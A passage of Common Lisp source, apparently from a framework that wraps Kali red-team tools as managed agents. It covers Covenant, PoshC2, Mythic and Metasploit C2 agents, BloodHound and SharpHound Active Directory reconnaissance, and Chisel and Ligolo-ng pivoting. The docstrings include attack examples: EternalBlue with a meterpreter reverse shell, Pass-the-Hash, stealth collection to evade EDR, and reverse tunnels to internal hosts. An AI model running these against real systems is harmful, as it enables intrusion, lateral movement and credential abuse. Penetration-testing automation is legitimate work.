    (let ((agent (make-instance 'covenant-agent
                                :binary (or binary "covenant")
                                :args args
                                :tool-category :exploit
                                :target server-addr
                                :server-addr server-addr
                                :api-token api-token
                                :grunt-name grunt-name
                                :listener-name listener-name
                                :capabilities '(:c2-framework :dotnet-c2
                                                :grunt-implant :inline-assembly
                                                :reflective-dll :rest-api
                                                :cross-platform)
                                :timeout *c2-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *c2-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.3.5  poshc2-agent — PoshC2 C2 Framework (PowerShell/Python)
;; ───────────────────────────────────────────────────────────────────────────

(defclass poshc2-agent (kali-agent)
  ((config :initarg :config
           :accessor poshc2-config
           :documentation
           "Path to PoshC2 configuration file (config.yml).
            Contains C2 server address, payload URLs, proxy settings,
            and implant configuration.")
   (payload-type :initarg :payload-type
                 :initform :powershell
                 :accessor poshc2-payload-type
                 :documentation
                 "Implant payload type: :POWERSHELL, :PYTHON, or :CSHARP.")
   (server-addr :initarg :server-addr
                :accessor poshc2-server-addr
                :documentation
                "PoshC2 server IP address or hostname.")
   ( implant-id :initarg :implant-id
                :initform nil
                :accessor poshc2-implant-id
                :documentation
                "Specific implant ID to interact with (optional).
            If nil, the agent monitors for new implants."))
  (:documentation
   "PoshC2 C2 framework agent — UK NCSC-developed red-team framework.

PoshC2 is a proxy-aware C2 framework used to aid penetration testers
with red teaming, post-exploitation, and lateral movement. It was
developed by the UK's National Cyber Security Centre (NCSC).

Key features:
  • Proxy-aware HTTP/HTTPS C2 communications
  • PowerShell and Python implants
  • SharpSploit integration for .NET offensive capabilities
  • Modular payload generation (EXE, DLL, PowerShell, VBA, JS)
  • Reporting and timeline generation
  • Built-in lateral movement modules
  • Database-backed implant tracking

PoshC2 is particularly well-suited for enterprise environments where
proxy-aware communications are essential.

Example:
  ;; Deploy with configuration file
  (make-poshc2-agent \"/opt/PoshC2/config.yml\"
    :payload-type :powershell
    :server-addr \"10.0.0.5\")

  ;; Interact with specific implant
  (make-poshc2-agent \"/opt/PoshC2/config.yml\"
    :implant-id \"IMPLANT-001\"
    :server-addr \"10.0.0.5\")"))

(defun make-poshc2-agent (config &key (payload-type :powershell)
                                      server-addr
                                      implant-id)
  "Create a PoshC2 C2 framework agent.

Parameters:
  CONFIG       — Path to PoshC2 config.yml (required).
  PAYLOAD-TYPE — Implant type: :POWERSHELL, :PYTHON, or :CSHARP.
  SERVER-ADDR  — PoshC2 server address (required).
  IMPLANT-ID   — Specific implant to interact with (optional).

Returns: A configured POSHC2-AGENT instance.

Install PoshC2 from: https://github.com/Nettitude/PoshC2

Thread-safety: Creates a new agent instance. Safe from any thread."
  (let* ((binary (or (find-kali-binary "posh")
                     (find-kali-binary "poshc2")
                     (warn "[C2] PoshC2 not found. Install from: https://github.com/Nettitude/PoshC2")))
         (payload-str (case payload-type
                        (:PYTHON "python")
                        (:CSHARP "csharp")
                        (t "powershell")))
         (args (append
                (list "-c" config)
                (list "-p" payload-str)
                (when server-addr (list "-s" server-addr))
                (when implant-id (list "-i" implant-id))
                (list "--headless"))))
    (let ((agent (make-instance 'poshc2-agent
                                :binary (or binary "poshc2")
                                :args args
                                :tool-category :exploit
                                :target server-addr
                                :config config
                                :payload-type payload-type
                                :server-addr server-addr
                                :implant-id implant-id
                                :capabilities '(:c2-framework :proxy-aware
                                                :powershell-agent :python-agent
                                                :lateral-movement :reporting
                                                :sharp-exploit)
                                :timeout *c2-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *c2-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.3.6  mythic-agent — Mythic C2 Framework (macOS-focused, cross-platform)
;; ───────────────────────────────────────────────────────────────────────────

(defclass mythic-agent (kali-agent)
  ((server-addr :initarg :server-addr
                :accessor mythic-server-addr
                :documentation
                "Mythic server address (host:port or full URL).
            Example: https://mythic.local:7443")
   (apitoken :initarg :apitoken
             :accessor mythic-apitoken
             :documentation
             "Mythic API token for authentication.
            Generate via Mythic UI: Admin → API Tokens")
   (callback-name :initarg :callback-name
                  :accessor mythic-callback-name
                  :documentation
                  "Name of the active callback (implant session) to interact with.")
   (payload-type-name :initarg :payload-type-name
                      :initform nil
                      :accessor mythic-payload-type-name
                      :documentation
                      "Mythic payload type for new payload generation.
            Examples: 'apfell', 'poseidon', 'hercules', 'atlas'."))
  (:documentation
   "Mythic C2 framework agent — cross-platform red-team platform with Docker agents.

Mythic is a collaborative, multi-platform, red-team framework designed
for red team operations and penetration testing. It uses Docker containers
for agent payloads, enabling extreme flexibility in implant design.

Key features:
  • Docker-based agent architecture (any language, any protocol)
  • Collaborative red-team operations (multiple operators)
  • Built-in payload type management (APFELL, Poseidon, Hercules, etc.)
  • Custom C2 profile support (HTTP, WebSocket, DNS, Slack, etc.)
  • GraphQL API for automation and integration
  • Built-in file browser, keylogger, screenshot capture
  • macOS-focused but cross-platform (Windows, Linux)

Payload types include:
  • apfell   — macOS Swift-based agent
  • poseidon — Go cross-platform agent
  • atlas    — Python cross-platform agent
  • hercules — C++ Windows agent

Example:
  ;; Interact with an active callback
  (make-mythic-agent \"https://mythic.local:7443\"
    :apitoken \"eyJhbGci...\"
    :callback-name \"CALLBACK-APFELL-01\")

  ;; Generate a new payload
  (make-mythic-agent \"https://mythic.local:7443\"
    :apitoken \"eyJhbGci...\"
    :payload-type-name "poseidon")"))

(defun make-mythic-agent (server-addr &key apitoken
                                          callback-name
                                          payload-type-name)
  "Create a Mythic C2 framework agent.

Parameters:
  SERVER-ADDR       — Mythic server URL (required).
  APITOKEN          — API authentication token (required).
  CALLBACK-NAME     — Active callback to interact with (optional).
  PAYLOAD-TYPE-NAME — Payload type for generation (optional).

Returns: A configured MYTHIC-AGENT instance.

Install Mythic from: https://github.com/its-a-feature/Mythic

Thread-safety: Creates a new agent instance. Safe from any thread."
  (let* ((binary (or (find-kali-binary "mythic-cli")
                     (find-kali-binary "mythic")
                     (warn "[C2] Mythic not found. Install from: https://github.com/its-a-feature/Mythic")))
         (args (append
                (when server-addr (list "--server" server-addr))
                (when apitoken (list "--token" apitoken))
                (when callback-name (list "--callback" callback-name))
                (when payload-type-name (list "--payload-type" payload-type-name))
                (list "--headless"))))
    (let ((agent (make-instance 'mythic-agent
                                :binary (or binary "mythic-cli")
                                :args args
                                :tool-category :exploit
                                :target server-addr
                                :server-addr server-addr
                                :apitoken apitoken
                                :callback-name callback-name
                                :payload-type-name payload-type-name
                                :capabilities '(:c2-framework :docker-agents
                                                :collaborative-c2 :graphql-api
                                                :cross-platform :macos-agent
                                                :websocket-c2)
                                :timeout *c2-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *c2-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.3.7  metasploit-enhanced-agent — Enhanced Metasploit with session management
;; ───────────────────────────────────────────────────────────────────────────

(defclass metasploit-enhanced-agent (kali-agent)
  ((exploit :initarg :exploit
            :accessor msf-exploit
            :documentation
            "Metasploit exploit module to use.
            Example: 'exploit/windows/smb/ms17_010_eternalblue'")
   (target :initarg :target
           :accessor msf-target
           :documentation
           "Target host(s) for the exploit.")
   (payload :initarg :payload
            :accessor msf-payload
            :documentation
            "Metasploit payload module.
            Example: 'windows/x64/meterpreter/reverse_tcp'")
   (lhost :initarg :lhost
          :accessor msf-lhost
          :documentation
          "Local host for reverse shell connections.")
   (lport :initarg :lport
          :accessor msf-lport
          :documentation
          "Local port for reverse shell listener.")
   (session-id :initarg :session-id
               :initform nil
               :accessor msf-session-id
               :documentation
               "Active Metasploit session ID to interact with.
            When set, the agent enters session management mode
            instead of exploit execution mode.")
   (options :initarg :options
            :initform '()
            :accessor msf-options
            :documentation
            "Additional Metasploit options as alist.
            Example: '(('SMBPIPE' . 'browser') ('TARGET' . '1'))")
   (resource-script :initarg :resource-script
                    :initform nil
                    :accessor msf-resource-script
                    :documentation
                    "Path to Metasploit resource script (.rc) to execute.
            Resource scripts automate multi-step engagements."))
  (:documentation
   "Enhanced Metasploit Framework agent with session management.

This is an enhanced subclass of the base Metasploit wrapper (MAKE-METASPLOIT-AGENT
in Section 5.2) that adds session management capabilities. While the base
wrapper handles single exploit execution, this enhanced agent can:
  • Manage multiple active sessions
  • Interact with existing sessions (meterpreter/shell)
  • Execute resource scripts for complex engagements
  • Provide session pivoting and routing
  • Auto-migrate to stable processes

Metasploit is the world's most used penetration testing framework.
It provides exploit modules for thousands of CVEs, post-exploitation
modules for privilege escalation and data exfiltration, and auxiliary
modules for scanning, fuzzing, and reconnaissance.

This enhanced agent is registered in both *c2-agent-registry* and
*kali-agent-registry* for unified management.

Example:
  ;; Exploit mode
  (make-metasploit-enhanced-agent
    \"exploit/windows/smb/ms17_010_eternalblue\"
    \"10.0.0.5\"
    :payload \"windows/x64/meterpreter/reverse_tcp\"
    :lhost \"10.0.0.100\"
    :lport 4444
    :options '((\"SMBPIPE\" . \"browser\")))

  ;; Session management mode
  (make-metasploit-enhanced-agent
    nil nil
    :session-id 1
    :resource-script \"/opt/msf/scripts/privesc.rc\")"))

(defun make-metasploit-enhanced-agent (exploit target &key payload
                                                            lhost
                                                            lport
                                                            session-id
                                                            options
                                                            resource-script)
  "Create an enhanced Metasploit Framework agent.

Parameters:
  EXPLOIT         — Metasploit exploit module (required for exploit mode).
  TARGET          — Target host(s) (required for exploit mode).
  PAYLOAD         — Metasploit payload module.
  LHOST           — Local host for reverse connections.
  LPORT           — Local port for reverse listener.
  SESSION-ID      — Session ID for session management mode.
  OPTIONS         — Additional options as alist.
  RESOURCE-SCRIPT — Path to .rc resource script.

Returns: A configured METASPLOIT-ENHANCED-AGENT instance.

Either (EXPLOIT + TARGET) or SESSION-ID must be provided. If both are
provided, SESSION-ID takes precedence (session management mode).

Thread-safety: Creates a new agent instance. Safe from any thread."
  (let* ((binary (or (find-kali-binary "msfconsole")
                     (warn "[C2] msfconsole not found. Install with: apt install metasploit-framework")))
         (msf-commands
          (cond
            ;; Session management mode
            (session-id
             (format nil "sessions -i ~D; ~@[resource ~A; ~]exit"
                     session-id resource-script))
            ;; Exploit mode
            ((and exploit target)
             (format nil "use ~A; set RHOSTS ~A; ~@[set PAYLOAD ~A; ~]~@[set LHOST ~A; ~]~@[set LPORT ~D; ~]~{set ~A ~A; ~}~@[resource ~A; ~]run -z; exit"
                     exploit target payload lhost lport
                     (alexandria:flatten options)
                     resource-script))
            (t
             (warn "[METASPLOIT] Either (exploit + target) or session-id must be provided.")
             "exit")))
         (args (list "-q" "-x" msf-commands)))
    (let ((agent (make-instance 'metasploit-enhanced-agent
                                :binary (or binary "msfconsole")
                                :args args
                                :tool-category :exploit
                                :target (or target (format nil "session-~A" session-id))
                                :exploit exploit
                                :payload payload
                                :lhost lhost
                                :lport lport
                                :session-id session-id
                                :options options
                                :resource-script resource-script
                                :capabilities '(:c2-framework :exploit-framework
                                                :session-management :meterpreter
                                                :resource-scripts :pivoting
                                                :post-exploitation)
                                :timeout *c2-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *c2-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))



;; ═══════════════════════════════════════════════════════════════════════════
;; Section O.4: BloodHound / Active Directory Reconnaissance Agents
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; BloodHound uses graph theory to reveal hidden and often unintended
;; relationships within Active Directory environments. Attackers (and
;; defenders) use it to identify attack paths, shortest paths to Domain
;; Admin, and ACL-based privilege escalation chains.

;; ───────────────────────────────────────────────────────────────────────────
;; O.4.1  bloodhound-python-agent — Python BloodHound ingestor
;; ───────────────────────────────────────────────────────────────────────────

(defclass bloodhound-python-agent (kali-agent)
  ((domain :initarg :domain
           :accessor bh-domain
           :documentation
           "Active Directory domain to enumerate (required).
            Example: 'CORP.LOCAL' or 'corp.local'")
   (username :initarg :username
             :accessor bh-username
             :documentation
             "Domain username for authentication.")
   (password :initarg :password
             :accessor bh-password
             :documentation
             "Domain user password.")
   (hashes :initarg :hashes
           :initform nil
           :accessor bh-hashes
           :documentation
           "NTLM hash for Pass-the-Hash authentication.")
   (collection-method :initarg :collection-method
                      :initform :all
                      :accessor bh-collection-method
                      :documentation
                      "Data collection scope. One of:
            :ALL         — Collect everything (default)
            :DEFAULT     — Standard collection (users, groups, computers)
            :GROUP       — Group membership only
            :LOCALADMIN  — Local admin collection
            :SESSION     — Session collection (requires admin)
            :ACL         — ACL/ACE enumeration
            :TRUST       — Domain trust enumeration
            :LOGGEDON    — Logged-on user enumeration
            :OBJECTPROP  — Object properties only
            :ALL — is equivalent to :DEFAULT + :ACL + :TRUST + :GROUP + :LOCALADMIN")
   (dns-server :initarg :dns-server
               :initform nil
               :accessor bh-dns-server
               :documentation
               "Custom DNS server for domain resolution.
            Use when the system DNS cannot resolve AD domain names.")
   (output-prefix :initarg :output-prefix
                  :initform nil
                  :accessor bh-output-prefix
                  :documentation
                  "Output file prefix for JSON results.
            BloodHound produces JSON files that are imported into
the BloodHound GUI for graph analysis.")
   (kerberos :initarg :kerberos
             :initform nil
             :accessor bh-kerberos
             :documentation
             "If T, use Kerberos authentication instead of NTLM.
            Requires valid Kerberos ticket in the environment."))
  (:documentation
   "BloodHound Python — Active Directory reconnaissance and attack path analysis.

BloodHound-Python is the Python-based BloodHound ingestor, an alternative
to the C# SharpHound. It collects Active Directory data and outputs JSON
files that can be imported into the BloodHound GUI for visualization.

Collection capabilities:
  • Domain users, groups, and computers
  • Group membership and nested groups
  • Local admin rights (via SAMR or DCOM)
  • Active sessions (via NetBIOS/DCOM)
  • ACLs and ACEs (permissions analysis)
  • Domain trusts (intra-forest and external)
  • GPO relationships
  • LAPS passwords (if accessible)

The collected data reveals:
  • Shortest attack paths to Domain Admin
  • Kerberoastable accounts (SPN-based)
  • AS-REP roastable accounts (no pre-auth)
  • Unconstrained/constrained delegation paths
  • DCSync privileges
  • Cross-domain trust attack paths

Example:
  ;; Full domain collection with password auth
  (make-bloodhound-python-agent \"corp.local\" \"jsmith\"
    :password \"P@ssw0rd\"
    :collection-method :all
    :output-prefix \"/tmp/corp-bh\")

  ;; Pass-the-Hash with specific collection
  (make-bloodhound-python-agent \"corp.local\" \"admin\"
    :hashes \"aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\"
    :collection-method :default)

  ;; Kerberos authentication
  (make-bloodhound-python-agent \"corp.local\" \"jsmith\"
    :kerberos t
    :collection-method :all
    :dns-server \"dc01.corp.local\")"))

(defun make-bloodhound-python-agent (domain username &key password
                                                              hashes
                                                              (collection-method :all)
                                                              dns-server
                                                              output-prefix
                                                              kerberos)
  "Create a BloodHound Python AD reconnaissance agent.

Parameters:
  DOMAIN            — Active Directory domain name (required).
  USERNAME          — Domain username (required).
  PASSWORD          — Domain password (optional, use HASHES for PtH).
  HASHES            — NTLM hash for Pass-the-Hash (optional).
  COLLECTION-METHOD — Scope: :all, :default, :group, :localadmin,
                      :session, :acl, :trust, :loggedon, :objectprop.
  DNS-SERVER        — Custom DNS server IP (optional).
  OUTPUT-PREFIX     — Output file prefix for JSON results (optional).
  KERBEROS          — If T, use Kerberos auth (default NTLM).

Returns: A configured BLOODHOUND-PYTHON-AGENT instance.

Install bloodhound-python with: pip install bloodhound

Thread-safety: Creates a new agent instance. Safe from any thread."
  (let* ((binary (or (find-kali-binary "bloodhound-python")
                     (find-kali-binary "bloodhound.py")
                     (warn "[AD-RECON] bloodhound-python not found. Install with: pip install bloodhound")))
         (collection-str (case collection-method
                           (:all "All")
                           (:default "Default")
                           (:group "Group")
                           (:localadmin "LocalAdmin")
                           (:session "Session")
                           (:acl "ACL")
                           (:trust "Trust")
                           (:loggedon "LoggedOn")
                           (:objectprop "ObjectProp")
                           (t "All")))
         (args (append
                (list "-d" domain)
                (list "-u" username)
                (when password (list "-p" password))
                (when hashes (list "--hashes" hashes))
                (list "-c" collection-str)
                (when dns-server (list "--dns-server" dns-server))
                (when output-prefix (list "-o" output-prefix))
                (when kerberos (list "-k")))))
    (let ((agent (make-instance 'bloodhound-python-agent
                                :binary (or binary "bloodhound-python")
                                :args args
                                :tool-category :recon
                                :target domain
                                :domain domain
                                :username username
                                :password password
                                :hashes hashes
                                :collection-method collection-method
                                :dns-server dns-server
                                :output-prefix output-prefix
                                :kerberos kerberos
                                :capabilities '(:ad-recon :bloodhound
                                                :attack-path-analysis
                                                :acl-analysis :trust-mapping
                                                :session-enumeration
                                                :kerberoast-detection)
                                :timeout 600
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *ad-recon-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.4.2  sharphound-agent — C# BloodHound ingestor (SharpHound)
;; ───────────────────────────────────────────────────────────────────────────

(defclass sharphound-agent (kali-agent)
  ((domain :initarg :domain
           :accessor bh-domain
           :documentation
           "Active Directory domain to enumerate.")
   (username :initarg :username
             :initform nil
             :accessor bh-username
             :documentation
             "Domain username (optional — may use current context).")
   (password :initarg :password
             :initform nil
             :accessor bh-password)
   (collection-method :initarg :collection-method
                      :initform :all
                      :accessor bh-collection-method
                      :documentation
                      "Collection scope: :ALL :DEFAULT :GROUP :LOCALADMIN
            :SESSION :ACL :TRUST :RDP :PSREMOTE :DCOM
            :GPOLocalGroup :SPNTargets :Container")
   (output-directory :initarg :output-directory
                     :initform nil
                     :accessor bh-output-directory
                     :documentation
                     "Directory for output ZIP/JSON files.")
   (zip-filename :initarg :zip-filename
                 :initform nil
                 :accessor bh-zip-filename
                 :documentation
                 "Custom ZIP output filename.")
   (memcache :initarg :memcache
             :initform nil
             :accessor bh-memcache
             :documentation
             "If T, keep data in memory (faster, more memory).
            If NIL, cache to disk (slower, less memory).")
   (stealth :initarg :stealth
            :initform nil
            :accessor bh-stealth
            :documentation
            "If T, use stealth collection techniques to reduce detection.
            Slower but less likely to trigger EDR alerts."))
  (:documentation
   "SharpHound — C# BloodHound ingestor for Active Directory reconnaissance.

SharpHound is the official C# BloodHound ingestor. It is typically
executed on a compromised Windows host (via .NET runtime) but can also
run via Cobalt Strike, Sliver, or other implant frameworks.

This agent wraps SharpHound execution via Mono (on Linux) or directly
on a Windows host. It produces JSON/ZIP files for BloodHound import.

SharpHound collection methods:
  • All          — Full collection (all methods combined)
  • Default      — Users, groups, computers, trusts
  • Group        — Group membership
  • LocalAdmin   — Local administrator rights
  • Session      — Active sessions (requires local admin)
  • ACL          — Access control lists
  • Trust        — Domain trust relationships
  • RDP          — Remote Desktop permissions
  • PSRemote     — PowerShell remoting permissions
  • DCOM         — DCOM permissions
  • GPOLocalGroup — GPO-local group mapping
  • SPNTargets   — Kerberoastable SPN targets
  • Container    — Container structure

Stealth mode reduces the number of parallel connections and adds
jitter between requests to avoid detection by network monitoring tools.

Example:
  ;; Full collection via Mono
  (make-sharphound-agent \"corp.local\"
    :collection-method :all
    :output-directory \"/tmp/sharphound-output\")

  ;; Stealth collection with specific methods
  (make-sharphound-agent \"corp.local\"
    :collection-method '(:default :acl :trust)
    :stealth t
    :zip-filename \"corp-stealth.zip\")"))

(defun make-sharphound-agent (domain &key username
                                        password
                                        (collection-method :all)
                                        output-directory
                                        zip-filename
                                        memcache
                                        stealth)
  "Create a SharpHound C# BloodHound ingestor agent.

Parameters:
  DOMAIN            — Active Directory domain (required).
  USERNAME          — Domain username (optional).
  PASSWORD          — Domain password (optional).
  COLLECTION-METHOD — Collection scope (default :all).
  OUTPUT-DIRECTORY  — Output directory path (optional).
  ZIP-FILENAME      — Custom ZIP output name (optional).
  MEMCACHE          — If T, use in-memory caching.
  STEALTH           — If T, enable stealth collection mode.

Returns: A configured SHARPHOUND-AGENT instance.

SharpHound.exe requires Mono on Linux: apt install mono-complete
Download SharpHound from: https://github.com/BloodHoundAD/SharpHound

Thread-safety: Creates a new agent instance. Safe from any thread."
  (let* ((binary (or (find-kali-binary "SharpHound.exe")
                     (find-kali-binary "sharphound")
                     (warn "[AD-RECON] SharpHound not found. Install mono + download SharpHound.exe")))
         (collection-str
          (if (listp collection-method)
              (format nil "~{~A~^,~}"
                      (mapcar (lambda (m)
                                (case m
                                  (:all "All")
                                  (:default "Default")
                                  (:group "Group")
                                  (:localadmin "LocalAdmin")
                                  (:session "Session")
                                  (:acl "ACL")
                                  (:trust "Trust")
                                  (:rdp "RDP")
                                  (:psremote "PSRemote")
                                  (:dcom "DCOM")
                                  (:gpolocalgroup "GPOLocalGroup")
                                  (:spntargets "SPNTargets")
                                  (:container "Container")
                                  (t (string-capitalize (string m)))))
                              collection-method))
              (case collection-method
                (:all "All")
                (:default "Default")
                (:group "Group")
                (:localadmin "LocalAdmin")
                (:session "Session")
                (:acl "ACL")
                (:trust "Trust")
                (t "All"))))
         (args (append
                (list "-d" domain)
                (when username (list "-u" username))
                (when password (list "-p" password))
                (list "-c" collection-str)
                (when output-directory (list "--outputdirectory" output-directory))
                (when zip-filename (list "--zipfilename" zip-filename))
                (when memcache (list "--memcache"))
                (when stealth (list "--stealth")))))
    (let ((agent (make-instance 'sharphound-agent
                                :binary (or binary "SharpHound.exe")
                                :args args
                                :tool-category :recon
                                :target domain
                                :domain domain
                                :username username
                                :password password
                                :collection-method collection-method
                                :output-directory output-directory
                                :zip-filename zip-filename
                                :memcache memcache
                                :stealth stealth
                                :capabilities '(:ad-recon :bloodhound
                                                :csharp-ingestor :attack-paths
                                                :stealth-collection)
                                :timeout 600
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *ad-recon-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ═══════════════════════════════════════════════════════════════════════════
;; Section O.5: Tunneling / Pivoting Agents
;; ═══════════════════════════════════════════════════════════════════════════
;;
;; Tunneling and pivoting agents create network tunnels through
;; compromised hosts to reach otherwise inaccessible network segments.
;; They are essential for lateral movement and accessing internal
;; resources during red-team operations.

;; ───────────────────────────────────────────────────────────────────────────
;; O.5.1  chisel-agent — Fast TCP Tunnel over HTTP
;; ───────────────────────────────────────────────────────────────────────────

(defclass chisel-agent (kali-agent)
  ((mode :initarg :mode
         :accessor chisel-mode
         :documentation
         "Chisel operating mode:
            :SERVER — Run as tunnel server (listen for connections)
            :CLIENT — Connect to tunnel server and forward ports")
   (listen-addr :initarg :listen-addr
                :accessor chisel-listen
                :documentation
                "Listen address in host:port format.
            For :SERVER mode, this is where chisel listens.
            For :CLIENT mode, this is the SOCKS5 proxy address.")
   (remote-addr :initarg :remote-addr
                :initform nil
                :accessor chisel-remote
                :documentation
                "Remote address for :CLIENT mode.
            Format: '[remote]host:port' or a list of remotes.
            Examples: 'R:8080' (reverse tunnel),
                      '3000' (forward local 3000 through tunnel).")
   (server-addr :initarg :server-addr
                :initform nil
                :accessor chisel-server-addr
                :documentation
                "Chisel server URL for :CLIENT mode.
            Example: 'http://compromised-host:8080'")
   (auth :initarg :auth
         :initform nil
         :accessor chisel-auth
         :documentation
         "Authentication string 'user:pass' for server access control.")
   (fingerprint :initarg :fingerprint
                :initform nil
                :accessor chisel-fingerprint
                :documentation
                "Server fingerprint for TLS verification (JHSA format).")
   (reverse :initarg :reverse
            :initform nil
            :accessor chisel-reverse
            :documentation
            "If T, server supports reverse port forwarding.
            Required for reverse tunnels (R: prefix in remotes)."))
  (:documentation
   "Chisel — fast TCP tunnel over HTTP, transported over WebSocket.

Chisel is a fast TCP tunnel transported over HTTP, secured via SSH.
It creates a single TCP connection (WebSocket upgrade) that multiplexes
multiple port forwards through a single HTTP connection.

Key features:
  • Single executable (written in Go), cross-platform
  • Automatic TLS encryption over HTTPS
  • SOCKS5 proxy support (client mode)
  • Reverse port forwarding (pivot inbound)
  • Forward port forwarding (pivot outbound)
  • Authentication support
  • Fast and stable — designed for C2 and red-team ops

Common use cases:
  • Pivot through a DMZ host to internal networks
  • SOCKS5 proxy for tools that don't support pivoting
  • Reverse tunnel for callbacks from isolated networks
  • Tunneling RDP/SSH through HTTP-only egress

Architecture:
    [Attacker] <---> [Chisel Client] <--HTTP/WebSocket--> [Chisel Server] <---> [Target Network]

Example:
  ;; Server mode (on compromised/pivot host)
  (make-chisel-agent :server \"0.0.0.0:8080\"
    :auth \"redteam:secret123\"
    :reverse t)

  ;; Client mode (on attacker machine)
  (make-chisel-agent :client \"127.0.0.1:1080\"
    :server-addr \"http://dmz-host:8080\"
    :remote '(\"R:3389:internal-dc:3389\" \"1080\"))

  ;; SOCKS5 proxy through tunnel
  (make-chisel-agent :client \"127.0.0.1:1080\"
    :server-addr \"http://pivot-host:8080\"
    :remote '(\"socks\"))"))

(defun make-chisel-agent (mode listen-addr &key remote-addr
                                                  server-addr
                                                  auth
                                                  fingerprint
                                                  reverse)
  "Create a Chisel tunnel agent.

Parameters:
  MODE        — :SERVER or :CLIENT (required).
  LISTEN-ADDR — Listen address host:port (required).
  REMOTE-ADDR — Remote port forward spec(s) for client mode (optional).
  SERVER-ADDR — Server URL for client mode (optional, required for client).
  AUTH        — Authentication string 'user:pass' (optional).
  FINGERPRINT — Server fingerprint for TLS verification (optional).
  REVERSE     — If T, server supports reverse forwarding (server mode only).

Returns: A configured CHISEL-AGENT instance.

Install Chisel: apt install chisel
Or download from: https://github.com/jpillora/chisel

Thread-safety: Creates a new agent instance. Safe from any thread."
  (let* ((binary (or (find-kali-binary "chisel")
                     (warn "[TUNNEL] chisel not found. Install with: apt install chisel")))
         (mode-str (if (eq mode :server) "server" "client"))
         (args (append
                (list mode-str)
                ;; Server-specific options
                (when (and (eq mode :server) reverse) (list "--reverse"))
                (when auth (list "--auth" auth))
                (when fingerprint (list "--fingerprint" fingerprint))
                ;; Listen address (with --host for server)
                (if (eq mode :server)
                    (list "--host" listen-addr)
                    (list listen-addr))
                ;; Client-specific options
                (when (eq mode :client)
                  (when server-addr (list server-addr))
                  (when remote-addr
                    (if (listp remote-addr)
                        remote-addr
                        (list remote-addr)))))))
    (let ((agent (make-instance 'chisel-agent
                                :binary (or binary "chisel")
                                :args (alexandria:flatten args)
                                :tool-category :exploit
                                :target (or server-addr listen-addr)
                                :mode mode
                                :listen-addr listen-addr
                                :remote-addr remote-addr
                                :server-addr server-addr
                                :auth auth
                                :fingerprint fingerprint
                                :reverse reverse
                                :capabilities '(:tunneling :pivoting
                                                :socks5-proxy :port-forwarding
                                                :reverse-tunnel :http-tunnel)
                                :timeout *c2-default-timeout*
                                :restart-policy #'kali-default-restart-policy)))
      (bt:with-lock-held (*offensive-registry-lock*)
        (setf (gethash (agent-id agent) *tunnel-agent-registry*) agent))
      (register-kali-agent agent)
      agent)))


;; ───────────────────────────────────────────────────────────────────────────
;; O.5.2  ligolo-ng-agent — Advanced Tunneling and Pivoting
;; ───────────────────────────────────────────────────────────────────────────

(defclass ligolo-ng-agent (kali-agent)
  ((mode :initarg :mode
         :accessor ligolo-mode
         :documentation
         "Ligolo-ng operating mode:
            :PROXY — Run as proxy server (attacker side)
            :AGENT — Run as agent (compromised host side)")
   (listen-addr :initarg :listen-addr
                :accessor ligolo-listen
                :documentation
                "Listen address in host:port format.
            For :PROXY mode, the address to bind the control listener.
            For :AGENT mode, the proxy address to connect to.")
   (self-cert :initarg :self-cert
              :initform t
              :accessor ligolo-self-cert
              :documentation
              "If T, generate self-signed TLS certificates automatically.
            If NIL, use custom certificates specified via :lport and :lhost.")
   (lport :initarg :lport
          :initform 11601
          :accessor ligolo-lport
          :documentation
          "Proxy listen port for agent connections (proxy mode, default 11601).")
   (tun-interface :initarg :tun-interface
                  :initform "ligolo"
                  :accessor ligolo-tun-interface
                  :documentation
                  "TUN interface name for network tunneling (proxy mode).
            Requires root/cap_net_admin to create TUN device.")
   (agent-iface :initarg :agent-iface
                :initform nil
                :accessor ligolo-agent-iface
                :documentation
                "Agent interface for auto-interface mode.")
   (socks5-addr :initarg :socks5-addr
                :initform nil
                :accessor ligolo-socks5-addr
                :documentation
                "Enable SOCKS5 proxy on specified address (proxy mode).
            Example: '127.0.0.1:1080'"))
  (:documentation
   "Ligolo-ng — advanced tunneling/pivoting tool with TUN interface.

Ligolo-ng is an advanced yet simple tunneling tool with a TUN interface.
Unlike Chisel (which uses SOCKS5 proxy), Ligolo-ng creates a full TUN
interface on the proxy side, allowing the attacker to route ANY traffic
(including UDP, ICMP, raw sockets) through the tunnel — just like a VPN.

Key features:
  • Full TUN interface (layer 3 tunneling, not just TCP)
  • Supports UDP, TCP, and ICMP through the tunnel
  • Self-signed TLS certificates (automatic)
  • Multi-agent support (one proxy, many agents)
  • Built-in SOCKS5 proxy option
  • Auto-configuration (automatic interface/routing setup)
  • Fast and stable — written in Go

Architecture:
    [Attacker] <---TUN (ligolo)---> [Ligolo Proxy] <---TLS---> [Ligolo Agent] <---[Target Network]
    Any tool can route through the TUN interface as if on the target network.

Comparison with Chisel:
  • Ligolo-ng: Layer 3 tunnel (TUN), supports UDP/ICMP, requires root
  • Chisel:    Layer 4 proxy (SOCKS5), TCP only, no root required

Example:
  ;; Proxy mode (on attacker machine, requires root)
  (make-ligolo-ng-agent :proxy \"0.0.0.0:11601\"
    :self-cert t
    :tun-interface \"ligolo\"
    :socks5-addr \"127.0.0.1:1080\")

  ;; Agent mode (on compromised host)
